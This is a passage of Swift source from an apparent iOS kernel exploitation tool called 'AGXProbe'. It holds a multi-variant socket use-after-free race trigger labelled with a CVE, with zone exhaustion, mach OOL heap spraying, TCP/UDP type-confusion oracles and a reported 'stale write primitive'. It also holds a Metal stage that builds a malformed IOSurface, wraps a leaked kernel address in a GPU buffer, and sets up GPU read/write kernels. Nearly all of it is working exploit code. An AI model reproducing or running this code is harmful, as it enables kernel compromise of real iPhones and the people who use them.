        let port = 8080
        let precPort = 8089
        let udpPort = precPort + 1
        let iterations = ProcessInfo.processInfo.arguments.contains("--sockmix") ? 2000 : 3000

        // loopback listener so target connects are ESTABLISHED
        let listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        var laddr = sockaddr_in()
        laddr.sin_family = sa_family_t(AF_INET)
        laddr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, ip, &laddr.sin_addr)
        var yesVal: Int32 = 1
        setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
        _ = withUnsafePointer(to: &laddr) { p in
            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                bind(listenFd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        listen(listenFd, 128)

        // precision listener: peers only ever receive stale writes
        let plisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        var paddr = sockaddr_in()
        paddr.sin_family = sa_family_t(AF_INET)
        paddr.sin_port = in_port_t(UInt16(precPort).bigEndian)
        inet_pton(AF_INET, ip, &paddr.sin_addr)
        setsockopt(plisten, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
        _ = withUnsafePointer(to: &paddr) { q in
            q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                bind(plisten, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        listen(plisten, 256)
        let peerLock = NSLock()
        var precPeers: [Int32] = []
        Thread.detachNewThread {
            while true {
                let c = accept(plisten, nil, nil)
                if c < 0 { usleep(200); continue }
                peerLock.lock(); precPeers.append(c); peerLock.unlock()
            }
        }

        // datagram oracle: nothing sends on dgram sockets here, so a datagram
        // can only come from a stale sender pushed through a reclaimed slot.
        let udpListener = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        if udpListener >= 0 {
            var ua = sockaddr_in()
            ua.sin_family = sa_family_t(AF_INET)
            ua.sin_port = in_port_t(UInt16(udpPort).bigEndian)
            inet_pton(AF_INET, "127.0.0.1", &ua.sin_addr)
            setsockopt(udpListener, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
            _ = withUnsafePointer(to: &ua) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    bind(udpListener, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            _ = fcntl(udpListener, F_SETFL, O_NONBLOCK)
            emitBg("[*] sockfield UDP oracle listening on 127.0.0.1:\(udpPort)")
        } else {
            emitBg("[!] sockfield UDP oracle socket failed errno=\(errno)")
        }

        let st = SockUafState()
        let sendLen = 8192
        let sendBuf = UnsafeMutablePointer<UInt8>.allocate(capacity: sendLen)
        sendBuf.initialize(repeating: 0x41, count: sendLen)
        let stRef = st
        for _ in 0..<6 { Thread.detachNewThread { self.sockUafSenderLoop(stRef, sendBuf, sendLen) } }
        Thread.detachNewThread { self.sockUafCloserLoop(stRef) }

        var hits = 0, xtypeHits = 0, fieldHits = 0
        let t0 = Date()
        for it in 0..<iterations {
            let target = sockUafMakeSocket(ip, port)
            if target < 0 { usleep(200); continue }
            // The precision race returns 0/1/2; we need the hammer fds, so this
            // mode does its own in-window dgram hammer instead of reusing
            // sockUafRacePrecision's closed bookkeeping.
            st.fd = target; st.done = 0; st.entered = 0; st.phase = 1; st.mode = 1
            usleep(60)
            st.gate = 1
            var e = 0
            while st.entered < 6 && e < 200_000 { e &+= 1 }
            st.phase = 2
            var spins = 0
            while st.phase != 3 && spins < 400_000 { spins &+= 1 }
            if st.phase != 3 {
                if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
            }
            let doneAtClose = st.done

            // In-window hammer: allocate connected dgram sockets while stale
            // senders may still be inside their syscall. Track them for the
            // field diff.
            var udpAddr = sockaddr_in()
            udpAddr.sin_family = sa_family_t(AF_INET)
            udpAddr.sin_port = in_port_t(UInt16(udpPort).bigEndian)
            inet_pton(AF_INET, "127.0.0.1", &udpAddr.sin_addr)
            var hammerFds: [Int32] = []
            var w = 0
            while st.done < 6 && w < 200_000 && hammerFds.count < 256 {
                let u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
                if u < 0 { break }
                _ = withUnsafePointer(to: &udpAddr) { q in
                    q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                        connect(u, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                    }
                }
                hammerFds.append(u)
                w &+= 1
            }
            let spray = sockUafSprayConnected(48, precPort)
            var one: UInt8 = 0x42
            for _ in 0..<3 { for fd in spray { _ = send(fd, &one, 1, MSG_DONTWAIT) } }
            while st.done < 6 && w < 400_000 { w &+= 1 }
            st.gate = 0; st.phase = 0; st.fd = -1; st.mode = 0
            usleep(150)

            // Drain the oracle first: a hit here names the collision.
            var udgrams = 0, ubytes = 0
            if udpListener >= 0 {
                var ubuf = [UInt8](repeating: 0, count: 65536)
                while true {
                    let r = recv(udpListener, &ubuf, ubuf.count, MSG_DONTWAIT)
                    if r <= 0 { break }
                    udgrams += 1; ubytes += r
                }
            }
            if udgrams > 0 {
                xtypeHits += 1
                emitBg("[!] ITER \(it) sockfield: *** CROSS-TYPE HIT: \(udgrams) datagram(s)/\(ubytes) byte(s) (hammer=\(hammerFds.count), in flight at close \(doneAtClose)/6) ***")
            }

            // Field differential on the hammer fds (the reclaimed slots).
            var stages = [Int32](repeating: 0, count: 8)
            let fh = sockuaf_field_probe(it % 2 == 0 ? "odd" : "even",
                                         &hammerFds, Int32(hammerFds.count), &stages)
            if fh > 0 {
                fieldHits += 1
                emitBg("[!] ITER \(it) sockfield: *** FIELD DIFF on \(fh) hammer fd(s): scanned=\(stages[0]) hits=\(stages[1]) readfail=\(stages[2]) ctl=\(stages[3]) ***")
            }

            // Drain peers.
            var got = 0
            var rbuf = [UInt8](repeating: 0, count: 65536)
            peerLock.lock(); let snapshot = precPeers; precPeers.removeAll(); peerLock.unlock()
            for pf in snapshot {
                var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
                while r > 0 { got += r; r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT) }
            }
            for pf in snapshot { close(pf) }
            for fd in spray { close(fd) }
            for u in hammerFds { close(u) }
            if got > 3 * spray.count + 512 { hits += 1 }

            if it % 20 == 0 {
                let secs = Date().timeIntervalSince(t0)
                emitBg(String(format: "[*] iter %d/%d  %.1f it/s  xtype=%d field=%d peerBytes=%d",
                               it, iterations, Double(it) / max(secs, 0.001),
                               xtypeHits, fieldHits, got))
            }
            usleep(200)
        }

        st.stop = 1
        usleep(5000)
        emitBg("[+] sockfield: \(xtypeHits) cross-type hit(s), \(fieldHits) field-diff hit(s), \(hits) peer hit(s) in \(iterations) iterations")
        emitBg("=== sockfield done ===")
        await MainActor.run { self.status = "Complete"; self.isRunning = false }
    }

    nonisolated func runSocketUafMode() async {
        await MainActor.run { self.isRunning = true; self.status = "Socket UAF..."; self.log = "" }
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emitBg("=== CVE-2026-112514 socket UAF trigger (17 Pro, hammer build) ===")
        // Oracle self-test: TCP_CONNECTION_INFO as a send-queue reader.
        // (SO_NWRITE does not exist on iOS.)
        do {
            let lfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            var la = sockaddr_in()
            la.sin_family = sa_family_t(AF_INET)
            la.sin_port = in_port_t(UInt16(8081).bigEndian)
            inet_pton(AF_INET, "127.0.0.1", &la.sin_addr)
            var one: Int32 = 1
            setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, socklen_t(MemoryLayout<Int32>.size))
            _ = withUnsafePointer(to: &la) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    bind(lfd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            listen(lfd, 4)
            let cf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            _ = withUnsafePointer(to: &la) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    connect(cf, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            usleep(2000)
            let ap = accept(lfd, nil, nil)
            var idle = [UInt8](repeating: 0, count: 256)
            var il = socklen_t(256)
            let ir = getsockopt(cf, IPPROTO_TCP, 0x106, &idle, &il)
            var vv = [UInt8](repeating: 0x5a, count: 16)
            _ = send(cf, &vv, 16, 0)
            usleep(1000)
            var load = [UInt8](repeating: 0, count: 256)
            var ll = socklen_t(256)
            let lr = getsockopt(cf, IPPROTO_TCP, 0x106, &load, &ll)
            var diffs = ""
            for k in 0..<min(256, Int(min(il, ll))) where idle[k] != load[k] {
                diffs += String(format: " %d:%02x->%02x", k, idle[k], load[k])
            }
            emitBg("[*] oracle tcpinfo: idle r=\(ir) len=\(il) load r=\(lr) len=\(ll) diffs:\(diffs)")
            close(ap); close(cf); close(lfd)
        }
        signal(SIGPIPE, SIG_IGN)
        let ip = "127.0.0.1"
        let port = 8080
        let iterations = 40000
        let senderCount = 6

        // --- local loopback listener so connects reach ESTABLISHED ---
        let listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        var laddr = sockaddr_in()
        laddr.sin_family = sa_family_t(AF_INET)
        laddr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, ip, &laddr.sin_addr)
        var yesVal: Int32 = 1
        setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
        _ = withUnsafePointer(to: &laddr) { p in
            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                bind(listenFd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        listen(listenFd, 128)
        let heldLock = NSLock()
        var heldAccepted: [Int32] = []
        Thread.detachNewThread {
            while true {
                let c = accept(listenFd, nil, nil)
                if c < 0 { usleep(200); continue }
                // Hold a bounded number of peers open and never read them, so
                // their receive buffers stay queued and the target's send path
                // has to take the buffer-full branch.
                heldLock.lock()
                if heldAccepted.count >= 160 { close(heldAccepted.removeFirst()) }
                heldAccepted.append(c)
                heldLock.unlock()
            }
        }

        // --- precision listener: peers here only ever receive stale writes ---
        let precPort = 8089
        let plisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        var paddr = sockaddr_in()
        paddr.sin_family = sa_family_t(AF_INET)
        paddr.sin_port = in_port_t(UInt16(precPort).bigEndian)
        inet_pton(AF_INET, ip, &paddr.sin_addr)
        setsockopt(plisten, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
        _ = withUnsafePointer(to: &paddr) { q in
            q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                bind(plisten, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        listen(plisten, 256)
        let peerLock = NSLock()
        var precPeers: [Int32] = []
        Thread.detachNewThread {
            while true {
                let c = accept(plisten, nil, nil)
                if c < 0 { usleep(200); continue }
                peerLock.lock()
                precPeers.append(c)
                peerLock.unlock()
            }
        }

        // --- UDP datagram oracle -------------------------------------------------
        // In --sockmix mode the hammer allocates *connected datagram* sockets into
        // the freed slot. Nothing ever calls send() on them, so a datagram arriving
        // here can only have been produced by the protocol send path being driven
        // on a reclaimed socket by a stale sender -- i.e. a TCP/UDP type confusion.
        // This is a positive detector: absence of datagrams proves nothing, presence
        // of one names the collision directly.
        let udpPort = precPort + 1
        let udpListener = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        if udpListener >= 0 {
            var ua = sockaddr_in()
            ua.sin_family = sa_family_t(AF_INET)
            ua.sin_port = in_port_t(UInt16(udpPort).bigEndian)
            inet_pton(AF_INET, "127.0.0.1", &ua.sin_addr)
            setsockopt(udpListener, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
            _ = withUnsafePointer(to: &ua) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    bind(udpListener, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            _ = fcntl(udpListener, F_SETFL, O_NONBLOCK)
            emitBg("[*] UDP datagram oracle listening on 127.0.0.1:\(udpPort)")
        } else {
            emitBg("[!] UDP oracle socket failed errno=\(errno)")
        }

        // --- persistent workers: created once, never torn down mid-run ---
        let st = SockUafState()
        let sendLen = 8192
        let sendBuf = UnsafeMutablePointer<UInt8>.allocate(capacity: sendLen)
        sendBuf.initialize(repeating: 0x41, count: sendLen)
        let sink = sendBuf
        let stRef = st
        for _ in 0..<senderCount {
            Thread.detachNewThread { self.sockUafSenderLoop(stRef, sink, sendLen) }
        }
        Thread.detachNewThread { self.sockUafCloserLoop(stRef) }

        // Pool of long-lived sockets whose send window we deliberately fill and
        // then leave alone: that arms the TCP retransmit timer (>1 s RTO), so a
        // close later races a live kernel timer, not only a syscall.
        var timers: [Int32] = []
        for _ in 0..<64 {
            let f = sockUafMakeSocket(ip, port)
            if f >= 0 {
                var guardCount = 0
                while guardCount < 512 {
                    if send(f, sendBuf, 2048, MSG_DONTWAIT) < 0 { break }
                    guardCount += 1
                }
                timers.append(f)
            }
        }
        emitBg("[*] timer pool: \(timers.count) sockets with armed retransmit timers")

        let oolOnly = ProcessInfo.processInfo.arguments.contains("--sockool")
        let xzOnly = ProcessInfo.processInfo.arguments.contains("--sockxz")
        let gcOnly = ProcessInfo.processInfo.arguments.contains("--sockgc")
        let udpOnly = ProcessInfo.processInfo.arguments.contains("--sockudp")
        let precOnly = ProcessInfo.processInfo.arguments.contains("--sockprec")
        let mixOnly = ProcessInfo.processInfo.arguments.contains("--sockmix")
        let lowBufOnly = ProcessInfo.processInfo.arguments.contains("--socklowbuf")
        if ProcessInfo.processInfo.arguments.contains("--zoneprobe") { sockUafZoneProbe(); return }
        if ProcessInfo.processInfo.arguments.contains("--cowprobe") { cowProbe(); return }
        if ProcessInfo.processInfo.arguments.contains("--cowfile") { cowFileProbe(); return }
        if ProcessInfo.processInfo.arguments.contains("--apfsrace") { apfsRaceProbe(); return }
        if ProcessInfo.processInfo.arguments.contains("--rawsock") { networkSurfaceProbe(); return }
        if ProcessInfo.processInfo.arguments.contains("--routesock") { routeSocketProbe(); return }
        if ProcessInfo.processInfo.arguments.contains("--reclaim") { vmReclaimProbe(); return }
        let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly || lowBufOnly
        var hits = 0
        var xtypeHits = 0
        let t0 = Date()
        var maxAfterClose: Int32 = 0

        // Zone-exhaustion pre-phase for the reclaim variants. Holding a large
        // population of sockets forces the socket zone to grow; freeing batches
        // then returns whole pages, which the OOL spray can take with attacker
        // bytes instead of another socket.
        var exhaustFds: [Int32] = []
        if solo && (oolOnly || xzOnly || gcOnly) {
            var rl = rlimit()
            if getrlimit(RLIMIT_NOFILE, &rl) == 0 {
                rl.rlim_cur = min(rlim_t(4096), rl.rlim_max)
                setrlimit(RLIMIT_NOFILE, &rl)
            }
            for _ in 0..<4096 {
                let f = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
                if f < 0 { break }
                exhaustFds.append(f)
            }
            emitBg("[*] zone exhaust: holding \(exhaustFds.count) sockets")
        }

        // --sockmix allocates up to 256 datagram sockets per iteration, so a
        // bounded run is enough; the other modes keep the full schedule.
        let effIterations = mixOnly ? min(iterations, 2000) : iterations
        for it in 0..<effIterations {
            // --sockmix keeps running: its signal is a panic or anomaly from a
            // cross-type collision, not a peer-delivery hit, so stopping at the
            // first normal hit would throw away the remaining attempts.
            if solo ? (!mixOnly && hits >= 1 && it > 40) : hits >= 20 { break }
            // NB: r==5 is the cross-zone reclaim (mach OOL), r==6 is the page-free
            // block, r==7 is batch GC. The solo flags used to be swapped here, so
            // --sockool ran the page-free variant and vice versa.
            let r = oolOnly ? 5 : (xzOnly ? 6 : (gcOnly ? 7 : (udpOnly ? 8 : ((precOnly || mixOnly || lowBufOnly) ? 4 : it % 5))))
            // Return a batch of held sockets so their pages go back to the page
            // allocator, giving the OOL spray fresh memory to occupy.
            if solo && !exhaustFds.isEmpty && it % 2 == 0 {
                var n = 0
                while n < 64 && !exhaustFds.isEmpty {
                    close(exhaustFds.removeLast())
                    n += 1
                }
            }
            if r == 0 {
                // ---- variant A: single TCP socket, close racing in-kernel sends ----
                let target = sockUafMakeSocket(ip, port)
                if target >= 0 {
                    if sockUafRaceOnce(st, target, 192, it, "single") { hits += 1 }
                }
            } else if r == 1 {
                // ---- variant B: 8 sockets, close evens, race sends on one odd ----
                var fds: [Int32] = []
                for _ in 0..<8 {
                    let f = sockUafMakeSocket(ip, port)
                    if f >= 0 { fds.append(f) }
                }
                if fds.count >= 6 {
                    usleep(300)
                    var i = 0
                    while i < fds.count { close(fds[i]); fds[i] = -1; i += 2 }
                    if sockUafRaceOnce(st, fds[1], 256, it, "multi") { hits += 1 }
                    i = 3
                    while i < fds.count { if fds[i] >= 0 { close(fds[i]) }; i += 2 }
                } else {
                    for f in fds { close(f) }
                }
            } else if r == 2 {
                // ---- variant C: AF_UNIX socketpair, close racing in-kernel sends ----
                var pair: [Int32] = [-1, -1]
                let pr = pair.withUnsafeMutableBufferPointer { buf -> Int32 in
                    socketpair(AF_UNIX, SOCK_STREAM, 0, buf.baseAddress)
                }
                if pr == 0 {
                    // small buffers: force the send path through the full-buffer
                    // branch instead of letting loopback drain instantly
                    var small: Int32 = 4096
                    setsockopt(pair[0], SOL_SOCKET, SO_SNDBUF, &small, socklen_t(MemoryLayout<Int32>.size))
                    setsockopt(pair[1], SOL_SOCKET, SO_RCVBUF, &small, socklen_t(MemoryLayout<Int32>.size))
                    if sockUafRaceOnce(st, pair[0], 192, it, "unixpair") { hits += 1 }
                    if pair[1] >= 0 { close(pair[1]) }
                }
            } else if r == 3 {
                // ---- variant D: retire a timer-armed socket (keepalive/RTO live) ----
                if !timers.isEmpty {
                    let idx = it % timers.count
                    let t = timers[idx]
                    timers[idx] = sockUafMakeSocket(ip, port)
                    if t >= 0 { if sockUafRaceOnce(st, t, 192, it, "timer") { hits += 1 } }
                }
            } else if r == 4 {
                            // ---- variant E: one burst per sender, peer-delivery oracle ----
                            // --sockmix adds the cross-type datagram contention; its return
                            // value is 1 for a plain stale write, 2 for a datagram delivered
                            // through a reclaimed dgram socket (TCP/UDP type confusion).
                            let target = sockUafMakeSocket(ip, port)
                            if target >= 0 {
                                let hr = sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock,
                                                              false, mixOnly, udpPort, udpListener)
                                if hr > 0 { hits += 1 }
                                if hr == 2 { xtypeHits += 1 }
                            }
                        } else if r == 5 {
                // ---- variant F: cross-zone reclaim with mach OOL pages ----
                let target = sockUafMakeSocket(ip, port)
                if target >= 0 {
                    if sockUafRaceCrossZone(st, target, it, oolSpraySize(), 256, precPort, &precPeers, peerLock) { hits += 1 }
                }
            } else if r == 6 {
                // ---- variant G: free a whole socket page, then OOL spray ----
                var block: [Int32] = []
                for _ in 0..<16 { let f = sockUafMakeSocket(ip, port); if f >= 0 { block.append(f) } }
                if block.count >= 8 {
                    let mid = block.count / 2
                    if sockUafRacePageFree(st, block, mid, it, 512, precPort, &precPeers, peerLock) { hits += 1 }
                } else {
                    for f in block { close(f) }
                }
            } else if r == 7 {
                // ---- variant H: large batch free past the zone GC delay ----
                if sockUafRaceBatchGC(st, 700, 700, it, 512, precPort, &precPeers, peerLock) { hits += 1 }
            } else {
                // ---- variant I: precision, UDP spray (cross-proto confusion) ----
                let target = sockUafMakeSocket(ip, port)
                if target >= 0 {
                    let hr = sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock, true)
                    if hr > 0 { hits += 1 }
                }
            }
            if st.postCloseOk > maxAfterClose { maxAfterClose = st.postCloseOk }
            // Cross-zone variants have no peer oracle; probe for sprayed bytes
            // showing up as real socket fields instead.
            if solo && r != 4 && it % 25 == 0 {
                let fh = sockUafFillProbe()
                if fh > 0 {
                    emitBg("[!] iter \(it) r=\(r): FILL-HIT x\(fh) — sprayed bytes readable as socket fields")
                }
            }
            // Pace the loop: the CPU watchdog kills the app at ~90 s of CPU per
            // 180 s window (see analysis/evidence AGXProbe.cpu_resource reports).
            usleep(200)

            if it % 200 == 0 && it > 0 {
                let secs = Date().timeIntervalSince(t0)
                var openFds = 0
                for f in 0..<1024 where fcntl(Int32(f), F_GETFL) >= 0 { openFds += 1 }
                var vmi = task_vm_info_data_t()
                var vmc = mach_msg_type_number_t(MemoryLayout<task_vm_info_data_t>.size / MemoryLayout<natural_t>.size)
                var foot: UInt64 = 0
                let krr = withUnsafeMutablePointer(to: &vmi) { q in
                    q.withMemoryRebound(to: integer_t.self, capacity: Int(vmc)) { ip in
                        task_info(mach_task_self(), task_flavor_t(TASK_VM_INFO), ip, &vmc)
                    }
                }
                if krr == KERN_SUCCESS { foot = vmi.phys_footprint }
                emitBg(String(format: "[*] iter %d/%d  %.1f it/s  sends=%d  afterClose(max)=%d  nwMax=%d  fds=%d  footprint=%lluMB",
                            it, effIterations, Double(it) / max(secs, 0.001), st.sends, maxAfterClose, st.nwMax,
                            Int32(openFds), foot / (1024 * 1024)))
            }
        }

        for f in exhaustFds { close(f) }
        st.stop = 1
        usleep(5000)
        for t in timers { if t >= 0 { close(t) } }
        if mixOnly {
            emitBg("[+] sockmix: \(xtypeHits) cross-type datagram hit(s), \(hits) total stale-write hit(s) in \(effIterations) iterations")
        } else {
            emitBg(hits > 0 ? "[+] socket UAF: \(hits) confirmed hit(s) — stale write primitive"
                           : "[-] race not won in \(effIterations) iterations")
        }
        await MainActor.run { self.status = "Complete"; self.isRunning = false }
    }

    func runMetalMode() async {
        isRunning = true; status = "Metal..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v123 - Brotli in-daemon oracle ===")
        emit("iOS " + ProcessInfo.processInfo.operatingSystemVersionString)

        // ---- 1. the Metal device + library ---------------------------------
        guard let device = MTLCreateSystemDefaultDevice() else {
            emit("[-] no Metal device"); status = "Complete"; isRunning = false; return
        }
        emit("device=\(device.name)")

        // the metallib: base64 -> Documents -> newLibraryWithURL
        guard let b64 = Optional(metallibBase64) else {
            emit("[-] metallib not embedded"); status = "Complete"; isRunning = false; return
        }
        let libURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("default.metallib")
        do {
            let data = Data(base64Encoded: b64) ?? Data()
            try data.write(to: libURL)
        } catch {
            emit("[-] metallib write failed: \(error)"); status = "Complete"; isRunning = false; return
        }
        emit("metallib written (\(libURL.path))")
        var lib: MTLLibrary? = device.makeDefaultLibrary()
        if lib == nil {
            do {
                lib = try device.makeLibrary(URL: libURL)
            } catch {
                emit("[-] library load failed: \(error)")
            }
        }
        guard let lib = lib else {
            emit("[-] no Metal library")
            status = "Complete"; isRunning = false; return
        }
        emit("library loaded")
        runMetalStage2(device: device, library: lib)
        status = "Complete"; isRunning = false
    }

    func runMetalStage2(device: MTLDevice, library: MTLLibrary) {
        // ---- 2. create the bogus surface via the raw user client ------------
        var iter: io_iterator_t = 0
        let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
        guard kr == 0 else { emit("[-] no IOSurfaceRoot"); return }
        let svc = xq_IOIteratorNext(iter)
        var conn: io_connect_t = 0
        let ok = xq_IOServiceOpen(svc, mach_task_self(), 0, &conn)
        guard conn != 0 else { emit("[-] open failed"); return }
        defer { _ = xq_IOServiceClose(conn) }

        let alloc = 0x10000
        let xml = f1XML(hdr: 0x40000000, data: 0x4000, sc: 4, alloc: alloc)
        var out = [UInt8](repeating: 0, count: 0xc68)
        var outSize: UInt64 = 0xc68
        var sc0: [UInt64] = [0]
        let r: Int32 = sc0.withUnsafeMutableBufferPointer { sb in
            xml.withUnsafeBufferPointer { pb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0, UnsafePointer(sb.baseAddress), 1,
                               pb.baseAddress, xml.count,
                               ob.baseAddress, &outSize)
                }
            }
        }
        func u64(_ o: Int) -> UInt64 {
            guard o + 8 <= out.count else { return 0 }
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
            return v
        }
        guard r == 0 else { emit("[-] surface create kr=\(krN(r))"); return }
        let sid = UInt32(u64(0x18) & 0xffffffff)
        let kbase = u64(0x00)
        emit("F1 surface created id=\(sid) kbase=0x\(String(kbase, radix: 16)) alloc=0x\(String(u64(0x20), radix: 16))")
        // full descriptor dump: the plane area is where the per-slice values live
        var dump = ""
        for o in stride(from: 0x40, to: 0xc8, by: 8) {
            dump += String(format: " %02x:%016x", o, u64(o))
        }
        emit("desc[0x40..0xc8]\(dump)")
        var hits = ""
        for o in stride(from: 0, to: 0xc8 - 8, by: 8) {
            let v = u64(o)
            if v == 0x40000000 || v == 0x4000 || v == 0x10000 {
                hits += " [0x\(String(o, radix: 16))=0x\(String(v, radix: 16))]"
            }
        }
        emit("descriptor occurrences of the per-slice values:\(hits.isEmpty ? " NONE" : hits)")

        // ---- 3. wrap the backing in an MTLBuffer ---------------------------
        // (IOSurfaceLookup gives us the IOSurfaceRef for the texture path)
        typealias LookupFn4 = @convention(c) (UInt32) -> UnsafeMutableRawPointer?
        var lookupFn: LookupFn4? = nil
        if let fw = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
           let lu = dlsym(fw, "IOSurfaceLookup") {
            lookupFn = unsafeBitCast(lu, to: LookupFn4.self)
        }
        guard let kp = UnsafeMutableRawPointer(bitPattern: Int(truncatingIfNeeded: kbase)) else { emit("[-] bad kbase"); return }
        guard let f1buf = device.makeBuffer(bytesNoCopy: kp, length: alloc, options: .storageModeShared) else {
            emit("[-] makeBuffer(bytesNoCopy: kernel base) failed")
            return
        }
        emit("F1 buffer wrap ok gpuAddress=0x\(String(f1buf.gpuAddress, radix: 16)) len=\(f1buf.length)")

        // MEASURE THE SURFACE'S GPU MAPPING SIZE.
        // If the bogus geometry reaches the driver, the IOSurface-backed
        // texture's GPU allocation is huge (the bogus per-slice size), and the
        // GPU-VA gap between a buffer allocated before it and one allocated
        // after it grows to match.  If the gap stays small, the driver only
        // ever saw the real 64 KiB and the F1 route is inert on this build.
        let gapBefore = device.makeBuffer(length: 0x1000, options: .storageModeShared)
        emit("probe buffer before: gpuAddress=0x\(String(gapBefore?.gpuAddress ?? 0, radix: 16))")
        var texInfo = "no texture"
        if let lk = lookupFn, let cs = lk(sid) {
            let csRef = unsafeBitCast(cs, to: IOSurfaceRef.self)
            let desc = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                                 width: 64, height: 64, mipmapped: false)
            desc.usage = [.shaderRead, .shaderWrite, .renderTarget]
            desc.storageMode = .shared
            if let tex = device.makeTexture(descriptor: desc, iosurface: csRef, plane: 0) {
                texInfo = "texture ok w=\(tex.width) h=\(tex.height)"
            } else {
                texInfo = "texture creation FAILED"
                // try again with a plain (non-ARGB) format and a private mode
                let d2 = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                                    width: 64, height: 64, mipmapped: false)
                d2.usage = [.shaderRead, .shaderWrite]
                d2.storageMode = .private
                if let tex2 = device.makeTexture(descriptor: d2, iosurface: csRef, plane: 0) {
                    texInfo = "texture ok (private) w=\(tex2.width) h=\(tex2.height)"
                }
            }
        }
        let gapAfter = device.makeBuffer(length: 0x1000, options: .storageModeShared)
        let ga = Int64(gapBefore?.gpuAddress ?? 0)
        let gb = Int64(gapAfter?.gpuAddress ?? 0)
        emit("\(texInfo); buffer after: gpuAddress=0x\(String(gb, radix: 16))")
        emit("GPU-VA gap across the IOSurface mapping = 0x\(String(gb - ga, radix: 16)) (0x10000 would mean the driver only saw the real allocation)")

        // a control buffer allocated after it (the F1 transcript relies on the
        // allocator handing out increasing addresses)
        guard let ctrl = device.makeBuffer(length: alloc, options: .storageModeShared) else {
            emit("[-] control buffer failed"); return
        }
        emit("CTRL buffer gpuAddress=0x\(String(ctrl.gpuAddress, radix: 16))")

        // ---- 4. the compute kernels ---------------------------------------
        guard let readFn = library.makeFunction(name: "readU32"),
              let writeFn = library.makeFunction(name: "writeU32") else {
            emit("[-] functions not found in the library"); return
        }
        guard let readPipe = try? device.makeComputePipelineState(function: readFn),
              let writePipe = try? device.makeComputePipelineState(function: writeFn) else {
            emit("[-] pipeline creation failed"); return
        }
        guard let queue = device.makeCommandQueue() else { emit("[-] no queue"); return }
        let result = device.makeBuffer(length: 4, options: .storageModeShared)!

        func readAt(_ offset: UInt32, _ buf: MTLBuffer? = nil) -> UInt32 {
            guard let cb = queue.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return 0 }
            enc.setComputePipelineState(readPipe)
            enc.setBuffer(buf ?? f1buf, offset: 0, index: 0)
            var off = offset
            enc.setBytes(&off, length: 4, index: 1)
            enc.setBuffer(result, offset: 0, index: 2)
            enc.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1),
                               threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            enc.endEncoding()
            cb.commit()
            cb.waitUntilCompleted()
            let p = result.contents().assumingMemoryBound(to: UInt32.self)
            return p.pointee
        }

        func writeAt(_ offset: UInt32, _ value: UInt32) -> Bool {
            guard let cb = queue.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return false }
            enc.setComputePipelineState(writePipe)
            enc.setBuffer(f1buf, offset: 0, index: 0)
            var off = offset
            var val = value
            enc.setBytes(&off, length: 4, index: 1)
            enc.setBytes(&val, length: 4, index: 2)
